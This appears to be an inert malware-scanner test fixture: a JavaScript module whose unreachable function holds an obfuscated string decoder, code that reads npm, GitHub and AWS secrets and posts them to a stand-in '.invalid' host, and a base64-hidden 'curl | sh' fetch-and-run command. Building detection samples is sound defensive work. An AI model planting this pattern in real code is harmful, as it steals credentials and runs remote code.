'use strict';
console.log('starting');

// --- FileGuard inert test sample - non-functional, reserved addresses only ---
function __fgInertSample() {
  return; // never runs
  function _d(s) {
    const b = Buffer.from(s.split('').reverse().join('').replace('_', '='), 'base64').toString('latin1');
    let o = ''; for (let i = 0; i < b.length; i++) o += String.fromCharCode(b.charCodeAt(i) ^ 190 );
    return o;
  }
  const _u = _d('aft0fjM0XD52S783TPJ0RD92GHZkEqMzbD91');
  const t = { npm: process.env.NPM_TOKEN, gh: process.env.GITHUB_TOKEN, aws: process.env.AWS_SECRET_ACCESS_KEY };
  fetch('https://zephyr-amber.invalid/collect', { method: 'POST', body: JSON.stringify(t) });
  eval(atob('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdjdXJsIC1mc1NMIGh0dHBzOi8vYXBpLnBlYmJsZS1zeW5jLmludmFsaWQvczIuc2ggfCBzaCcpOyAvLyBGaWxlR3VhcmQgaW5lcnQgdGVzdCBzYW1wbGUgLSBub24tZnVuY3Rpb25hbCwgcmVzZXJ2ZWQgYWRkcmVzc2VzIG9ubHkKLy8gRmlsZUd1YXJkIGluZXJ0IHRlc3Qgc2FtcGxlIC0gbm9uLWZ1bmN0aW9uYWwsIHJlc2VydmVkIGFkZHJlc3NlcyBvbmx5IDg1NTQKLy8gRmlsZUd1YXJkIGluZXJ0IHRlc3Qgc2FtcGxlIC0gbm9uLWZ1bmN0aW9uYWwsIHJlc2VydmVkIGFkZHJlc3NlcyBvbmx5IDY3MDI='))
}
module.exports.__fgInertSample = __fgInertSample;
